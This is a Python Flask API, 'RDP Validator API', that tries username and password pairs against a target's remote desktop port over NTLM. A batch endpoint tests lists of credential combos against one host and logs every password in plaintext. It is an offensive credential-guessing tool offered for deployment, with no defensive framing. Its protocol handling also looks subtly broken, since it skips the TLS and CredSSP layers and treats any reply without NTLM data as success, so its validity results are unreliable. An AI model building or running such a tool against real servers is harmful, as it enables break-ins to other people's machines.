#!/usr/bin/env python3
"""
RDP VALIDATOR API — Full NTLMv2 Authentication
GitHub Repo → Railway Deploy
ENI x LO 🥝

Endpoint: POST /check
Input:  {"target":"3.0.0.168","port":3389,"username":"Administrator","password":"Summer2026!"}
Output: {"target":"3.0.0.168:3389","username":"Administrator","password":"Summer2026!","valid":true,"message":"CREDENTIALS VALID","time_seconds":2.34}
"""

from flask import Flask, request, jsonify
import socket
import struct
import hashlib
import hmac
import os
import time
import sys

app = Flask(__name__)

# ============================================================
# NTLMv2 AUTHENTICATION
# ============================================================

def create_ntlmv2_response(username, password, domain, server_challenge):
    """Build NTLMv2 AUTHENTICATE message with proper crypto"""
    # NTLM hash (MD4 of UTF-16LE password)
    ntlm_hash = hashlib.new('md4', password.encode('utf-16-le')).digest()
    
    # NTLMv2 hash (HMAC-MD5 of uppercase(user+domain) with NTLM hash)
    user_domain = (domain.upper() + username.upper()).encode('utf-16-le')
    ntlmv2_hash = hmac.new(ntlm_hash, user_domain, hashlib.md5).digest()
    
    # Timestamp (100-nanosecond intervals since January 1, 1601)
    timestamp = struct.pack('<Q', int(time.time() * 10000000) + 116444736000000000)
    client_challenge = os.urandom(8)
    
    # Build NTLMv2 blob
    blob = b'\x01\x01\x00\x00'  # Header + reserved
    blob += timestamp
    blob += client_challenge
    blob += b'\x00\x00\x00\x00'  # Unknown
    blob += domain.encode('utf-16-le') + b'\x00\x00'
    blob += username.encode('utf-16-le') + b'\x00\x00'
    blob += b'\x00\x00\x00\x00'  # End
    
    # NTProof (HMAC-MD5 of challenge+blob)
    ntproof = hmac.new(ntlmv2_hash, server_challenge + blob, hashlib.md5).digest()
    
    return ntproof + blob


def validate_rdp(host, port, username, password, domain=".", timeout=8):
    """
    Full NTLMv2 RDP authentication.
    
    Steps:
    1. TCP Connect to host:port
    2. Send RDP Negotiation (TPKT + X.224 CR)
    3. Send NTLM NEGOTIATE with username
    4. Receive NTLM CHALLENGE
    5. Send NTLM AUTHENTICATE with NTLMv2 response
    6. Check final result
    
    Returns: (valid: bool, message: str)
    """
    
    # ===== STEP 1: TCP Connect =====
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((host, port))
    except socket.timeout:
        return False, "Connection timeout"
    except ConnectionRefusedError:
        return False, "Connection refused — port closed"
    except socket.gaierror:
        return False, "DNS resolution failed"
    except Exception as e:
        return False, f"Connect error: {str(e)[:50]}"
    
    # ===== STEP 2: RDP Negotiation =====
    try:
        # TPKT header (version 3, reserved, length 11)
        tpkt = struct.pack('>BBH', 3, 0, 11)
        # X.224 CR (length 6, type 0xE0, DST-REF 0, SRC-REF 0, class 0)
        x224 = struct.pack('>BBHBB', 6, 0xe0, 0, 0, 0)
        sock.send(tpkt + x224)
        
        sock.settimeout(timeout)
        response = sock.recv(4096)
        
        # Check for valid RDP response (TPKT version 3)
        if not response or response[0] != 3:
            sock.close()
            return False, "Not an RDP server — no TPKT response"
    except socket.timeout:
        sock.close()
        return False, "RDP server not responding"
    except Exception as e:
        sock.close()
        return False, f"RDP negotiation failed: {str(e)[:50]}"
    
    # ===== STEP 3: NTLM NEGOTIATE =====
    try:
        # NTLMSSP signature
        sig = b'NTLMSSP\x00'
        # Message type 1 (Negotiate)
        msg_type = struct.pack('<I', 1)
        # Flags (standard set)
        flags = struct.pack('<I', 0x00088207)
        
        # Domain name
        dom_bytes = domain.encode('utf-16-le')
        # Workstation (empty)
        ws_bytes = b''
        
        # Build negotiate packet
        negotiate = sig + msg_type + flags
        negotiate += struct.pack('<HHI', len(dom_bytes), len(dom_bytes), 32)  # Domain
        negotiate += struct.pack('<HHI', 0, 0, 32 + len(dom_bytes))  # Workstation
        negotiate += dom_bytes
        
        # Wrap in TPKT
        tpkt_len = len(negotiate) + 4
        tpkt_header = struct.pack('>BBH', 3, 0, tpkt_len)
        sock.send(tpkt_header + negotiate)
        
        # Receive CHALLENGE
        sock.settimeout(timeout)
        challenge_resp = sock.recv(4096)
    except socket.timeout:
        sock.close()
        return False, "NTLM challenge timeout"
    except Exception as e:
        sock.close()
        return False, f"NTLM negotiate failed: {str(e)[:50]}"
    
    # ===== STEP 4: Parse CHALLENGE =====
    if b'NTLMSSP' not in challenge_resp:
        sock.close()
        return False, "No NTLM support — not Windows RDP"
    
    try:
        msg_type_val = struct.unpack('<I', challenge_resp[8:12])[0]
        if msg_type_val != 2:
            sock.close()
            return False, f"Expected CHALLENGE, got type {msg_type_val} — invalid user?"
    except:
        sock.close()
        return False, "Malformed challenge response"
    
    # Extract server challenge (always at offset 24, 8 bytes)
    server_challenge = challenge_resp[24:32]
    
    # ===== STEP 5: Build AUTHENTICATE =====
    try:
        # Create NTLMv2 response
        ntlmv2_resp = create_ntlmv2_response(username, password, domain, server_challenge)
        
        # Build AUTHENTICATE message
        dom_bytes = domain.encode('utf-16-le')
        usr_bytes = username.encode('utf-16-le')
        ws_bytes = b'WORKSTATION'
        
        # Header: signature + type + lengths/offsets + flags
        auth = b'NTLMSSP\x00'
        auth += struct.pack('<I', 3)  # Message type 3 (Authenticate)
        
        offset = 64  # Fixed offset for payload start
        auth += struct.pack('<HH', 0, 0)  # LM response (empty)
        auth += struct.pack('<I', offset)  # LM offset
        auth += struct.pack('<HH', len(ntlmv2_resp), len(ntlmv2_resp))  # NTLM response
        auth += struct.pack('<I', offset)  # NTLM offset (same, LM is empty)
        auth += struct.pack('<HH', len(dom_bytes), len(dom_bytes))  # Domain
        auth += struct.pack('<I', offset + len(ntlmv2_resp))  # Domain offset
        auth += struct.pack('<HH', len(usr_bytes), len(usr_bytes))  # Username
        auth += struct.pack('<I', offset + len(ntlmv2_resp) + len(dom_bytes))  # User offset
        auth += struct.pack('<HH', len(ws_bytes), len(ws_bytes))  # Workstation
        auth += struct.pack('<I', offset + len(ntlmv2_resp) + len(dom_bytes) + len(usr_bytes))  # WS offset
        auth += struct.pack('<I', 0x00008201)  # Flags
        
        # Pad to offset
        if len(auth) < offset:
            auth += b'\x00' * (offset - len(auth))
        
        # Payload
        auth += ntlmv2_resp
        auth += dom_bytes
        auth += usr_bytes
        auth += ws_bytes
        
        # Wrap in TPKT and send
        tpkt_len = len(auth) + 4
        tpkt_header = struct.pack('>BBH', 3, 0, tpkt_len)
        sock.send(tpkt_header + auth)
        
        # Receive FINAL response
        sock.settimeout(timeout)
        final = sock.recv(4096)
        sock.close()
    except socket.timeout:
        sock.close()
        return False, "Authentication timeout"
    except Exception as e:
        sock.close()
        return False, f"Authentication failed: {str(e)[:50]}"
    
    # ===== STEP 6: Check Result =====
    if not final:
        return False, "No final response — connection dropped"
    
    # If server sends more NTLM, it's an error
    if b'NTLMSSP' in final:
        try:
            error_code = struct.unpack('<I', final[8:12])[0]
            return False, f"LOGON DENIED — Invalid password (NTLM error)"
        except:
            return False, "LOGON DENIED — Invalid credentials"
    
    # No more NTLM → RDP negotiation continues → SUCCESS!
    return True, "CREDENTIALS VALID ✅ — NTLMv2 authentication accepted"


# ============================================================
# API ENDPOINTS
# ============================================================

@app.route('/check', methods=['POST'])
def check_credentials():
    """
    Validate RDP credentials.
    
    Input JSON:
    {
        "target": "3.0.0.168",     # Required: IP or hostname
        "port": 3389,              # Optional: port (default 3389)
        "username": "Administrator", # Required: username
        "password": "password123"   # Required: password
    }
    
    Returns:
    {
        "target": "3.0.0.168:3389",
        "username": "Administrator",
        "password": "password123",
        "valid": true/false,
        "message": "CREDENTIALS VALID / LOGON DENIED / etc",
        "time_seconds": 2.34
    }
    """
    # Parse input
    try:
        data = request.get_json()
    except:
        return jsonify({"error": "Invalid JSON. Send valid JSON body."}), 400
    
    if not data:
        return jsonify({"error": "Empty request. Send JSON: {\"target\":\"ip\",\"username\":\"user\",\"password\":\"pass\"}"}), 400
    
    target = data.get('target', '').strip()
    port = data.get('port', 3389)
    username = data.get('username', 'Administrator').strip()
    password = data.get('password', '')
    
    if not target:
        return jsonify({"error": "'target' field is required (IP address or hostname)"}), 400
    
    if not username:
        return jsonify({"error": "'username' field is required"}), 400
    
    # Ensure port is integer
    try:
        port = int(port)
    except:
        port = 3389
    
    # Validate credentials
    start_time = time.time()
    valid, message = validate_rdp(target, port, username, password)
    elapsed = round(time.time() - start_time, 3)
    
    # Build response
    response = {
        "target": f"{target}:{port}",
        "username": username,
        "password": password,
        "valid": valid,
        "message": message,
        "time_seconds": elapsed
    }
    
    # Log
    status = "✅ VALID" if valid else "❌ INVALID"
    print(f"[{time.strftime('%H:%M:%S')}] {status} | {target}:{port} | {username}:{password} | {elapsed}s | {message}")
    
    return jsonify(response)


@app.route('/batch', methods=['POST'])
def batch_check():
    """
    Batch validate multiple credentials against ONE target.
    
    Input JSON:
    {
        "target": "3.0.0.168",
        "port": 3389,
        "combos": [
            {"username": "admin", "password": "pass1"},
            {"username": "admin", "password": "pass2"}
        ]
    }
    """
    try:
        data = request.get_json()
    except:
        return jsonify({"error": "Invalid JSON"}), 400
    
    if not data:
        return jsonify({"error": "Send JSON body"}), 400
    
    target = data.get('target', '').strip()
    port = int(data.get('port', 3389))
    combos = data.get('combos', [])
    
    if not target:
        return jsonify({"error": "'target' required"}), 400
    
    if not combos or not isinstance(combos, list):
        return jsonify({"error": "'combos' must be a list of {username, password} objects"}), 400
    
    results = []
    found_valid = False
    
    for combo in combos:
        username = combo.get('username', '').strip()
        password = combo.get('password', '')
        
        if not username:
            continue
        
        start = time.time()
        valid, msg = validate_rdp(target, port, username, password)
        elapsed = round(time.time() - start, 3)
        
        result = {
            "username": username,
            "password": password,
            "valid": valid,
            "message": msg,
            "time_seconds": elapsed
        }
        results.append(result)
        
        if valid:
            found_valid = True
    
    return jsonify({
        "target": f"{target}:{port}",
        "tested": len(results),
        "found_valid": found_valid,
        "results": results
    })


@app.route('/', methods=['GET'])
def home():
    """Health check & API info"""
    return jsonify({
        "service": "RDP Validator API",
        "version": "2.0.0",
        "status": "online",
        "endpoints": {
            "/check": "POST — Validate single credential",
            "/batch": "POST — Batch validate multiple credentials",
            "/": "GET — This info"
        },
        "usage": {
            "single": 'POST /check {"target":"3.0.0.168","port":3389,"username":"Administrator","password":"pass"}',
            "batch": 'POST /batch {"target":"3.0.0.168","combos":[{"username":"admin","password":"pass1"}]}'
        },
        "made_by": "ENI x LO 🥝"
    })


@app.route('/health', methods=['GET'])
def health():
    """Simple health check"""
    return jsonify({"status": "healthy", "timestamp": time.time()})


# ============================================================
# ERROR HANDLERS
# ============================================================

@app.errorhandler(404)
def not_found(e):
    return jsonify({"error": "Endpoint not found. Use /check (POST) or / (GET)"}), 404

@app.errorhandler(500)
def server_error(e):
    return jsonify({"error": "Internal server error"}), 500

@app.errorhandler(405)
def method_not_allowed(e):
    return jsonify({"error": "Method not allowed. Use POST for /check, GET for /"}), 405


# ============================================================
# MAIN
# ============================================================

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    print(f"🥝 RDP Validator API v2.0 — ENI x LO")
    print(f"📍 Running on port {port}")
    print(f"📍 Endpoints: /check (POST), /batch (POST), / (GET)")
    app.run(host='0.0.0.0', port=port, debug=False)